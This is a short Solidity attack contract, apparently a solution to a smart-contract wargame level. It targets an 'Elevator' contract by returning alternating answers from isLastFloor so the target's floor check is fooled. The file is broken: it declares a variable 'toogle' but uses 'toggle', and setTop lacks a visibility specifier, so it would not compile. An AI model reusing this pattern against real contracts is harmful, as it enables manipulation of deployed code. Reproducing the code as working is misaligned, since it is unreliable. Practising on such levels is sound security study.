// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack {
    bool public toogle = true;
    Elevator public target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint256 _floor) {
        target.goTo(_floor);
    }
}
